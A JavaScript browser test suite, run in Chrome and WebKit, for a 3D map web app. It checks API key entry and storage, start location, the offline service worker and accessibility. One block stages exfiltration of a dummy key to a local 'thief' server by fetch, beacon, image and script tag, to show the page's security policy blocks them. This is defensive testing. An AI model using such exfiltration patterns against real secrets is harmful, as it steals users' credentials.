// Checks everything that works without a real Google API key: the key screen and how the key is
// kept, that the key reaches only Google, where you begin, links, and what a browser that cannot
// draw the world is told. It runs in Chrome and in WebKit, the engine of Safari and of every
// browser on an iPhone or iPad.
//
//   npm test                 Chrome, then WebKit if Playwright's WebKit is installed
//   npm run test:chrome
//   npm run test:webkit      (once: npx playwright-core install webkit)
//
// It serves the app itself, as the public demo is, with no key built in, and types a made-up
// key where one is needed (Google turns it down, which is checked too). No .env.local, no
// billing; it does need the network, for Google's refusal. It runs on GitHub with each push.
// CHROME sets which Chrome is used; SOFTWARE=1 draws without a graphics chip.
import { existsSync, readFileSync } from 'node:fs';
import { createServer as createHttpServer } from 'node:http';
import { mkdtemp, rm } from 'node:fs/promises';
import { createRequire } from 'node:module';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { build, createLogger, createServer, preview } from 'vite';
import { CHROME, CHROME_ARGS, check, finish, sleep, within } from './lib.mjs';

const require = createRequire( import.meta.url );
const { chromium, webkit } = require( 'playwright-core' );
const AXE = readFileSync( require.resolve( 'axe-core/axe.min.js' ), 'utf8' );

const ROOT = new URL( '..', import.meta.url ).pathname;
const KEY_STORE = 'google-maps-api-key';
const LAST_STORE = 'walk-and-fly-last';
const DUMMY = 'TESTKEY_not_a_real_key_0123456789'; // shaped like a key; Google refuses it
const CHROME_UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36';
const IPHONE_CHROME = 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/130.0.0.0 Mobile/15E148 Safari/604.1';
const MAC_SAFARI = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15';
const GOOGLE = [ 'tile.googleapis.com', 'maps.googleapis.com', 'maps.gstatic.com' ];
const PHONE = { viewport: { width: 390, height: 844 }, deviceScaleFactor: 1, isMobile: true, hasTouch: true };
const SLOW = process.env.SOFTWARE ? 5 : 1; // upper bounds only: a pass takes no longer

// --- the app, as the demo serves it: no key built in --------------------------------
// an empty folder for Vite's settings, so a key in .env.local (or the shell) is not picked up
const noEnv = await mkdtemp( join( tmpdir(), 'walk-and-fly-' ) );
delete process.env.VITE_GOOGLE_MAPS_API_KEY;
// the browser's console comes back through Vite; Google refusing the made-up key, and the
// policy stopping the pretend thief, are expected there
const logger = createLogger( 'warn' );
const fromPage = message => message.includes( '[console.' );
const quiet = {
	...logger,
	error: ( message, options ) => fromPage( message ) ? undefined : logger.error( message, options ),
	warn: ( message, options ) => fromPage( message ) ? undefined : logger.warn( message, options ),
};
// As GitHub Pages serves it: built, which adds the service worker. It is built first: starting
// the dev server sets NODE_ENV to development, and a build after that would leave production out.
const builtDir = await mkdtemp( join( tmpdir(), 'walk-and-fly-built-' ) );
await build( { root: ROOT, envDir: noEnv, customLogger: quiet, logLevel: 'warn', mode: 'production', build: { outDir: builtDir, emptyOutDir: true } } );
delete process.env.NODE_ENV; // the build set it to production; the dev server sets its own
const builtServer = await preview( { root: ROOT, envDir: noEnv, customLogger: quiet, build: { outDir: builtDir }, preview: { host: '127.0.0.1', port: 5197, strictPort: true } } );
const BUILT = builtServer.resolvedUrls.local[ 0 ];

// and as you work on it: the dev server
const server = await createServer( { root: ROOT, envDir: noEnv, customLogger: quiet, server: { host: '127.0.0.1', port: 5198 } } );
await server.listen();
const BASE = server.resolvedUrls.local[ 0 ];
const ORIGIN = new URL( BASE ).origin;

const OWN = [ ORIGIN, new URL( BUILT ).origin ];

// A pretend thief: another site (another port is another origin) that records whatever reaches it.
// What arrives is the proof; browsers differ in how, and whether, they report what they block.
const thiefHits = [];
const thief = createHttpServer( ( request, response ) => {

	thiefHits.push( `${ request.method } ${ request.url.split( '?' )[ 0 ] }` );
	response.setHeader( 'Access-Control-Allow-Origin', '*' );
	response.end( 'thanks' );

} );
await new Promise( resolve => thief.listen( 5196, '127.0.0.1', resolve ) );
const THIEF = 'http://127.0.0.1:5196';

const ENGINES = {
	chrome: () => chromium.launch( { executablePath: CHROME, args: CHROME_ARGS } ),
	webkit: () => webkit.launch(),
};

/**
 * Runs before every page load. A visit's test settings ride in the address (`?test=`), so one
 * script serves every visit and nothing has to be added or removed between them:
 * - `draw`: let the world be drawn. Without it the drawing is paused from the start, as no check
 *   needs the picture and drawing without a graphics chip starves everything else; tiles load
 *   only as frames are drawn, though, so waiting for Google's answer about the key needs it.
 * - `key`, `last`: put the made-up key, or a record of an earlier visit, in storage first
 *   (on the first load only, so reloads see what the app made of them).
 * - `standalone`: opened from a home-screen icon, as an iPhone's Safari reports it.
 * - `noWebGL`: a browser that cannot draw at all.
 */
const visitScript = ( { KEY_STORE, LAST_STORE, DUMMY } ) => {

	let test = {};
	try { test = JSON.parse( new URLSearchParams( location.search ).get( 'test' ) ?? '{}' ); } catch { /* not a test visit */ }
	document.addEventListener( 'securitypolicyviolation', e => console.warn( `blocked: ${ e.violatedDirective } ${ e.blockedURI.split( '?' )[ 0 ] }` ) );
	if ( test.noWebGL ) HTMLCanvasElement.prototype.getContext = () => null;
	if ( test.standalone ) {

		for ( const target of [ navigator, Navigator.prototype ] ) {

			try { Object.defineProperty( target, 'standalone', { configurable: true, get: () => true } ); } catch { /* the other one will do */ }

		}

	}
	if ( ! test.draw ) {

		let capture;
		Object.defineProperty( window, 'capture', { configurable: true, get: () => capture, set: value => { value.paused = true; capture = value; } } );

	}
	try {

		if ( ( test.key || test.last ) && ! sessionStorage.getItem( 'seeded' ) ) {

			sessionStorage.setItem( 'seeded', '1' );
			if ( test.key ) localStorage.setItem( KEY_STORE, DUMMY );
			if ( test.last ) {

				const { daysAgo, ...extra } = test.last;
				localStorage.setItem( LAST_STORE, JSON.stringify( { lat: 35.6586, lng: 139.7454, height: 400, mode: 'walk', heading: 90, pitch: 0, t: Date.now() - daysAgo * 864e5, ...extra } ) );

			}

		}

	} catch { /* about:blank has no storage */ }

};
const visit = ( url, test ) => {

	const u = new URL( url );
	if ( test && Object.keys( test ).length ) u.searchParams.set( 'test', JSON.stringify( test ) );
	return u.href;

};

// generous: after Change API key the page reloads itself, which drawing in software slows right down
const asksForKey = page => page.waitForSelector( '.setup form', { timeout: 20000 * SLOW } ).then( () => true, () => false );
const started = page => page.waitForFunction( () => window.player, null, { polling: 250, timeout: 20000 * SLOW } ).then( () => true, () => false );
const startsWithoutAsking = async page => await started( page ) && await page.$( '.setup form' ) === null;
const stored = page => page.evaluate( k => ( { local: localStorage.getItem( k ), session: sessionStorage.getItem( k ) } ), KEY_STORE );
/** axe-core's accessibility rules: the serious and critical problems on the page as it is. */
const audit = async page => {

	await page.evaluate( AXE ); // run by the test, so the page's security policy does not apply
	return page.evaluate( async () => ( await axe.run( document, { resultTypes: [ 'violations' ] } ) ).violations
		.filter( v => v.impact === 'serious' || v.impact === 'critical' )
		.map( v => ( { rule: v.id, impact: v.impact, where: v.nodes.slice( 0, 3 ).map( n => n.target.join( ' ' ) ) } ) ) );

};
const rest = page => page.evaluate( () => { if ( window.capture ) window.capture.paused = true; } ).catch( () => {} );
/** Where you are, once you are near the expected spot (or after `wait` ms). */
const near = async ( page, lat, lng, wait = 20000 * SLOW ) => {

	await page.waitForFunction( ( { lat, lng } ) => {

		if ( ! window.player ) return false;
		const at = world.toLatLng( player.position );
		return Math.abs( at.lat - lat ) < 1e-3 && Math.abs( at.lng - lng ) < 1e-3;

	}, { lat, lng }, { polling: 250, timeout: wait } ).catch( () => {} );
	// with a made-up key no ground ever loads, so you are still arriving: the mode you will land in is the one to look at
	return page.evaluate( () => window.player ? { ...world.toLatLng( player.position ), mode: player.resume?.mode ?? player.mode, heading: Math.round( player.heading ) } : null );

};
const isAt = ( at, lat, lng ) => !! at && Math.abs( at.lat - lat ) < 1e-3 && Math.abs( at.lng - lng ) < 1e-3;
const round = at => at && { lat: + at.lat.toFixed( 4 ), lng: + at.lng.toFixed( 4 ), mode: at.mode, heading: at.heading };
const PARIS = { latitude: 48.8584, longitude: 2.2945 };

async function suite( engine ) {

	const errors = [];
	// Every request any page makes, so that the key can be shown to reach only Google, and the
	// policy to block nothing the app needs
	const sent = new Map(); // request → whether it carried the key; ones the policy stops never leave the browser

	/**
	 * A fresh browser profile: nothing stored, and location allowed only when given one.
	 *
	 * Each profile is a browser of its own, with one tab, shut entirely when done with. Without a
	 * graphics chip (on GitHub), closing a tab and opening another can stall Chrome for minutes, so
	 * tabs are never closed and opened mid-run.
	 */
	const profile = async ( { geo, userAgent, viewport } = {} ) => {

		const browser = await ENGINES[ engine ]();
		const context = await browser.newContext( {
			...PHONE, ...( viewport ? { viewport } : {} ), ...( userAgent ? { userAgent } : {} ),
			...( geo ? { geolocation: geo, permissions: [ 'geolocation' ] } : {} ),
		} );
		await context.addInitScript( visitScript, { KEY_STORE, LAST_STORE, DUMMY } );
		const page = await context.newPage();
		page.setDefaultTimeout( 30000 * SLOW );
		page.on( 'pageerror', e => errors.push( e.message ) );
		page.on( 'console', m => { if ( m.text().startsWith( 'blocked: ' ) && ! m.text().includes( THIEF ) ) errors.push( m.text() ); } );
		page.on( 'request', r => {

			const url = new URL( r.url() );
			if ( ! url.protocol.startsWith( 'http' ) || OWN.includes( url.origin ) ) return;
			sent.set( r, [ r.url(), r.postData() ?? '', JSON.stringify( r.headers() ) ].some( part => part.includes( DUMMY ) ) );

		} );
		// each browser words it differently
		page.on( 'requestfailed', r => { if ( /csp|content security|blocked/i.test( r.failure()?.errorText ?? '' ) ) sent.delete( r ); } );
		let visited = false;
		return {
			context,
			close: () => browser.close(),
			/** A fresh visit, as in a new tab: the tab's own storage starts empty. `test` is as for `visitScript`. */
			open: async ( url = BASE, test = {} ) => {

				if ( visited ) {

					await rest( page );
					await page.evaluate( () => sessionStorage.clear() ).catch( () => {} );
					await page.goto( 'about:blank' );

				}

				visited = true;
				await page.goto( visit( url, test ), { waitUntil: 'domcontentloaded' } );
				return page;

			},
		};

	};

	// --- the key screen fits every screen --------------------------------------------------
	{

		const p = await profile();
		const page = await p.open();
		check( 'a first visit asks for a key', await asksForKey( page ) );
		const origin = await page.$eval( '.setup .origin', e => e.textContent );
		check( 'it names this site, to restrict the key to', origin === `${ ORIGIN }/*`, origin );

		for ( const [ width, height ] of [ [ 320, 568 ], [ 390, 844 ], [ 568, 320 ], [ 844, 292 ], [ 1280, 720 ] ] ) {

			await page.setViewportSize( { width, height } );
			await sleep( 300 );
			const fit = await page.evaluate( () => {

				const box = document.querySelector( '.setup' ), r = box.getBoundingClientRect();
				const start = box.querySelector( 'form button' ).getBoundingClientRect();
				return {
					onScreen: r.left >= 0 && r.top >= 0 && r.right <= innerWidth + 0.5 && r.bottom <= innerHeight + 0.5,
					reachable: box.scrollHeight <= box.clientHeight + 1 || getComputedStyle( box ).overflowY === 'auto',
					startInside: start.left >= r.left && start.right <= r.right + 0.5,
					noSidewaysScroll: document.documentElement.scrollWidth <= innerWidth,
					font: getComputedStyle( box.querySelector( 'form input' ) ).fontSize,
				};

			} );
			check( `the key screen fits ${ width }x${ height }`, fit.onScreen && fit.reachable && fit.startInside && fit.noSidewaysScroll && fit.font === '16px', fit );

		}

		await page.setViewportSize( PHONE.viewport );
		const keyScreen = await audit( page );
		check( 'the key screen has no serious accessibility problems', keyScreen.length === 0, keyScreen );
		check( 'Remember the key on this device is ticked to begin with', await page.$eval( '.remember input', e => e.checked ) );
		await page.click( '.setup form button' );
		const empty = await page.$eval( '.problem', e => e.textContent );
		await page.fill( '.setup form input', 'not a key' );
		await page.click( '.setup form button' );
		const junk = await page.$eval( '.problem', e => e.textContent );
		check( 'an empty box or something that is not a key is refused, saying why', empty === 'Paste your API key first.' && junk.startsWith( 'That does not look like an API key' ) && await page.$( '.setup form' ) !== null, [ empty, junk ] );
		await p.close();

	}

	// --- a key is remembered on the device, unless you say not to ---------------------
	{

		const p = await profile();
		let page = await p.open( BASE, { draw: true } );
		await asksForKey( page );
		await page.fill( '.setup form input', DUMMY );
		await page.click( '.setup form button' );
		check( 'a key that looks right starts the app', await started( page ) );
		check( 'the key never reaches the address bar', ! page.url().includes( DUMMY ), page.url() );
		const kept = await stored( page );
		check( 'it is remembered on the device', kept.local === DUMMY && kept.session === null, kept );

		// Google refuses the made-up key: the page says so and offers another go
		const refusal = await page.waitForSelector( '.banner.show', { timeout: 30000 * SLOW } )
			.then( n => n.evaluate( e => ( { text: e.innerText, button: e.querySelector( 'button' )?.textContent } ) ) ).catch( () => null );
		check( 'a key Google turns down is reported, with a way to enter another', !! refusal && refusal.text.includes( 'Google' ) && refusal.button === 'Enter a different key', refusal );

		page = await p.open();
		check( 'a fresh visit does not ask again', await startsWithoutAsking( page ) );

		// the page reloads itself: wait for the new page, then for its key screen
		await Promise.all( [ page.waitForEvent( 'load', { timeout: 60000 * SLOW } ), page.evaluate( () => document.querySelector( '.goto .forget' ).click() ) ] );
		check( 'Change API key goes back to the key screen', await asksForKey( page ) );
		const forgotten = await stored( page );
		check( '…and forgets the key', forgotten.local === null && forgotten.session === null, forgotten );

		await page.click( '.remember input' );
		await page.fill( '.setup form input', DUMMY );
		await page.click( '.setup form button' );
		await started( page );
		const tabOnly = await stored( page );
		check( 'unticked, the key is kept for this tab only', tabOnly.local === null && tabOnly.session === DUMMY, tabOnly );
		await page.reload( { waitUntil: 'domcontentloaded' } );
		check( '…so a reload does not ask', await startsWithoutAsking( page ) );
		page = await p.open( BASE, { draw: true } );
		check( '…but a fresh visit does', await asksForKey( page ) );

		// "Enter a different key" on Google's refusal forgets it too
		await page.fill( '.setup form input', DUMMY );
		await page.click( '.setup form button' );
		await started( page );
		const retry = await page.waitForSelector( '.banner.show button', { timeout: 30000 * SLOW } ).catch( () => null );
		if ( retry ) await retry.click();
		check( 'Enter a different key goes back to the key screen and forgets it', !! retry && await asksForKey( page ) && ( await stored( page ) ).local === null );
		await p.close();

	}

	// --- opened from a home-screen icon ---------------------------------------------
	{

		const p = await profile();
		let page = await p.open( BASE, { standalone: true } );
		await asksForKey( page );
		await page.fill( '.setup form input', DUMMY );
		await page.click( '.setup form button' );
		await started( page );
		check( 'the home-screen app offers no Fullscreen button (it is full screen already)', await page.$( '.goto .fullscreen' ) === null );
		page = await p.open( BASE, { standalone: true } );
		check( 'the home-screen app keeps the key between launches', await startsWithoutAsking( page ) );
		await p.close();

		const tab = await profile();
		page = await tab.open( BASE, { key: true } );
		await started( page );
		const offered = await page.evaluate( () => ( { button: !! document.querySelector( '.goto .fullscreen' ), can: !! ( document.fullscreenEnabled || document.webkitFullscreenEnabled ) } ) );
		check( 'a browser tab offers Fullscreen where the browser can', offered.button === offered.can, offered );
		await tab.close();

	}

	// --- where you begin ---------------------------------------------------------------
	{

		const from = async ( options, url, test, lat, lng ) => {

			const p = await profile( options );
			const page = await p.open( url, test );
			const at = await near( page, lat, lng );
			const record = await page.evaluate( k => localStorage.getItem( k ), LAST_STORE );
			await p.close();
			return { at, record };

		};
		const paris = { geo: PARIS };
		let r = await from( {}, BASE, { key: true }, 51.5055, - 0.0754 );
		check( 'with location refused and nothing else to go on, you begin at the first preset', isAt( r.at, 51.5055, - 0.0754 ), round( r.at ) );
		r = await from( paris, BASE, { key: true }, PARIS.latitude, PARIS.longitude );
		check( 'with location allowed, you begin where you are', isAt( r.at, PARIS.latitude, PARIS.longitude ), round( r.at ) );
		r = await from( paris, `${ BASE }#40.74840,-73.98570`, { key: true }, 40.7484, - 73.9857 );
		check( 'a link wins over your location', isAt( r.at, 40.7484, - 73.9857 ), round( r.at ) );
		r = await from( paris, BASE, { key: true, last: { daysAgo: 6 } }, 35.6586, 139.7454 );
		check( 'a visit in the last week resumes there, on foot, facing the same way', isAt( r.at, 35.6586, 139.7454 ) && r.at.mode === 'walk' && r.at.heading === 90, round( r.at ) );
		r = await from( paris, `${ BASE }#35.65860,139.74540`, { key: true, last: { daysAgo: 1 } }, 35.6586, 139.7454 );
		check( 'a link to where you left off is a reload: you resume, still on foot', isAt( r.at, 35.6586, 139.7454 ) && r.at.mode === 'walk' && r.at.heading === 90, round( r.at ) );
		r = await from( paris, `${ BASE }#40.74840,-73.98570`, { key: true, last: { daysAgo: 1 } }, 40.7484, - 73.9857 );
		check( 'a link to somewhere else wins over where you left off', isAt( r.at, 40.7484, - 73.9857 ), round( r.at ) );
		r = await from( paris, BASE, { key: true, last: { daysAgo: 8 } }, PARIS.latitude, PARIS.longitude );
		check( 'a visit more than a week ago is forgotten', isAt( r.at, PARIS.latitude, PARIS.longitude ) && r.record === null, round( r.at ) );
		r = await from( paris, BASE, { key: true, last: { daysAgo: 1, lat: 'nowhere' } }, PARIS.latitude, PARIS.longitude );
		check( 'a damaged record of the last visit is ignored', isAt( r.at, PARIS.latitude, PARIS.longitude ), round( r.at ) );

		const p = await profile();
		const page = await p.open( `${ BASE }#%`, { key: true } );
		check( 'a mangled link still starts the app', await started( page ) );
		await page.evaluate( () => { location.hash = '#48.85840,2.29450'; } );
		const at = await near( page, PARIS.latitude, PARIS.longitude );
		check( 'a link pasted into the address bar while it is open is followed', isAt( at, PARIS.latitude, PARIS.longitude ), round( at ) );
		await p.close();

	}

	// --- the key goes to Google and nowhere else ------------------------------------------
	{

		const p = await profile();
		const page = await p.open( `${ BASE }#51.50800,-0.12810`, { key: true } );
		await started( page );
		// searching by name loads Google's Maps script with the key (Google refuses the made-up one)
		await page.evaluate( () => document.querySelector( '.goto-open' )?.click() );
		await page.fill( '.goto input', 'Eiffel Tower' );
		await page.press( '.goto input', 'Enter' );
		const note = await page.waitForFunction( () => document.querySelector( '.note' ).textContent, null, { polling: 250, timeout: 30000 * SLOW } ).then( h => h.jsonValue(), () => '' );
		check( 'searching by name reaches Google, and a refusal is explained', note.includes( 'Searching by name needs' ), note );

		// a change that tried to send the key elsewhere is stopped by the page's security policy
		thiefHits.length = 0;
		const tried = await page.evaluate( async ( { key, thief } ) => {

			const blocked = [];
			document.addEventListener( 'securitypolicyviolation', e => blocked.push( e.violatedDirective ) );
			await fetch( `${ thief }/fetch?k=${ key }` ).catch( () => {} );
			try { navigator.sendBeacon( `${ thief }/beacon`, key ); } catch { /* refused outright */ }
			new Image().src = `${ thief }/image?k=${ key }`;
			const s = document.createElement( 'script' );
			s.src = `${ thief }/script?k=${ key }`;
			document.head.append( s );
			await new Promise( r => setTimeout( r, 1500 ) );
			return blocked;

		}, { key: DUMMY, thief: THIEF } );
		check( 'the page refuses to send anything to another site, by fetch, beacon, image or script',
			thiefHits.length === 0 && [ 'connect-src', 'img-src', 'script-src' ].every( d => tried.some( t => t.startsWith( d ) ) ), { reached: thiefHits, blocked: tried } );
		await p.close();

	}

	// --- the built site keeps itself on the device -----------------------------------------
	{

		const p = await profile();
		let page = await p.open( BUILT, { draw: true } );
		check( 'the built site asks for a key', await asksForKey( page ) );
		const worker = await page.evaluate( () => Promise.race( [
			navigator.serviceWorker.ready.then( r => !! r.active ),
			new Promise( resolve => setTimeout( resolve, 20000, false ) ),
		] ) ).catch( () => false );
		// start the app, so Google's tiles and scripts are asked for with the key: none may be kept
		await page.fill( '.setup form input', DUMMY );
		await page.click( '.setup form button' );
		await started( page );
		await page.waitForSelector( '.banner.show', { timeout: 30000 * SLOW } ).catch( () => {} );
		await page.reload( { waitUntil: 'domcontentloaded' } );
		await started( page );
		const controlled = await page.evaluate( () => !! navigator.serviceWorker.controller );
		const registration = await page.evaluate( async () => { const r = await navigator.serviceWorker.getRegistration(); return r ? r.active?.state ?? ( r.installing ? 'installing' : 'waiting' ) : 'none'; } ).catch( e => e.message );
		check( 'it keeps itself on the device with a service worker', worker && controlled, { worker, controlled, registration } );
		const kept = await page.evaluate( async () => {

			const urls = [];
			for ( const name of await caches.keys() ) for ( const request of await ( await caches.open( name ) ).keys() ) urls.push( request.url );
			return urls;

		} );
		check( 'it keeps only its own files: nothing from Google, nothing with the key', kept.length > 0 && kept.every( u => new URL( u ).origin === new URL( BUILT ).origin && ! u.includes( DUMMY ) ),
			kept.filter( u => new URL( u ).origin !== new URL( BUILT ).origin || u.includes( DUMMY ) ) );

		// no signal at all: it opens from what it kept
		await rest( page );
		await p.context.setOffline( true );
		page = await p.open( BUILT, {} );
		check( 'with no signal, it still opens', await started( page ) );
		await p.context.setOffline( false );
		await p.close();

	}

	// --- a page that cannot zoom ------------------------------------------------------
	{

		const p = await profile();
		const page = await p.open( BASE, { key: true } );
		await started( page );
		const zoom = await page.evaluate( () => ( {
			viewport: document.querySelector( 'meta[name=viewport]' ).content,
			scene: getComputedStyle( document.getElementById( 'view' ) ).touchAction,
			panels: [ ...document.querySelectorAll( '#ui > *' ) ].map( e => getComputedStyle( e ).touchAction ),
		} ) );
		// Safari keeps a pinch-zoom across reloads, and the scene would not let you pinch back out
		check( 'nothing can pinch- or double-tap-zoom the page', zoom.viewport.includes( 'maximum-scale=1' ) && zoom.scene === 'none' && zoom.panels.every( t => t === 'pan-x pan-y' || t === 'none' ), zoom );

		const app = await audit( page );
		check( 'the running app has no serious accessibility problems', app.length === 0, app );
		await page.evaluate( () => document.querySelector( '.goto-open' )?.click() );
		const box = await audit( page );
		check( '…nor with the place box open', box.length === 0, box );
		// Escape puts the box away and hands the keyboard back to its button (where the box folds away)
		await page.press( '.goto input', 'Escape' );
		const after = await page.evaluate( () => ( { open: document.querySelector( '.goto' ).classList.contains( 'open' ), expanded: document.querySelector( '.goto-open' ).getAttribute( 'aria-expanded' ), focus: document.activeElement?.className } ) );
		check( 'Escape closes the place box and returns to its button', ! after.open && after.expanded === 'false' && after.focus.includes( 'goto-open' ), after );
		const facing = await page.$eval( '.compass', e => e.getAttribute( 'aria-label' ) );
		check( 'the compass says which way you face', /^Facing (north|south|east|west)/.test( facing ?? '' ), facing );
		await p.close();

	}

	// --- a browser that cannot draw it at all ------------------------------------------------
	{

		const told = async ( userAgent, viewport ) => {

			const p = await profile( { userAgent, viewport } );
			const page = await p.open( BASE, { key: true, noWebGL: true } );
			const said = await page.waitForSelector( '.setup', { timeout: 15000 * SLOW } ).then( n => n.evaluate( e => {

				const r = e.getBoundingClientRect();
				return { text: e.textContent, fits: r.left >= 0 && r.right <= innerWidth && r.top >= 0 && r.bottom <= innerHeight + 0.5 };

			} ) ).catch( () => ( { text: '', fits: false } ) );
			await p.close();
			return said;

		};

		let said = await told( CHROME_UA, { width: 1280, height: 720 } );
		check( 'a browser without WebGL gets an explanation, not a blank page', said.text.includes( 'cannot draw the 3D world' ) && ! said.text.includes( 'Lockdown' ) && said.fits, said.text.trim().slice( 0, 60 ) );
		said = await told( IPHONE_CHROME, { width: 320, height: 568 } );
		check( 'on an iPhone it names Lockdown Mode, how Safari excludes the site, and to use Safari', said.text.includes( 'Lockdown Mode' ) && said.text.includes( 'Website Settings' ) && said.text.includes( 'open this page in Safari' ) && said.fits, said.fits );
		said = await told( MAC_SAFARI, { width: 1280, height: 720 } );
		check( 'in Safari on a Mac it says which setting excludes this site', said.text.includes( 'Lockdown Mode' ) && said.text.includes( `Settings for ${ new URL( BASE ).hostname }` ) && said.fits, said.fits );

	}

	const hosts = new Set( [ ...sent.keys() ].map( r => new URL( r.url() ).host ) );
	const leaks = new Set( [ ...sent ].filter( ( [ r, carried ] ) => carried && ! GOOGLE.includes( new URL( r.url() ).host ) ).map( ( [ r ] ) => new URL( r.url() ).host ) );
	check( 'the key went to Google and nowhere else', leaks.size === 0 && [ ...sent.values() ].some( Boolean ), { leaks: [ ...leaks ], hosts: [ ...hosts ] } );
	check( 'the only other sites contacted are Google\'s', [ ...hosts ].every( h => GOOGLE.includes( h ) ), [ ...hosts ] );
	check( 'no errors on any page, and nothing the app needs was blocked', errors.length === 0, errors );

}

// --- which browsers ---------------------------------------------------------------------
const wanted = process.env.BROWSER ? process.env.BROWSER.split( ',' ) : [ 'chrome', 'webkit' ];
for ( const engine of wanted ) {

	if ( ! ENGINES[ engine ] ) throw new Error( `BROWSER must be chrome or webkit, not ${ engine }` );
	if ( engine === 'webkit' && ! existsSync( webkit.executablePath() ) ) {

		// asked for by name, it must run; as part of plain `npm test`, it is skipped with a hint
		if ( process.env.BROWSER ) throw new Error( 'WebKit is not installed: run  npx playwright-core install webkit' );
		console.log( '\n--- WebKit skipped: install it once with  npx playwright-core install webkit ---' );
		continue;

	}

	within( engine === 'chrome' ? 'Chrome' : 'WebKit' );
	await suite( engine );

}

await server.close();
await builtServer.close();
thief.close();
await rm( builtDir, { recursive: true, force: true } );
await rm( noEnv, { recursive: true, force: true } );
finish();
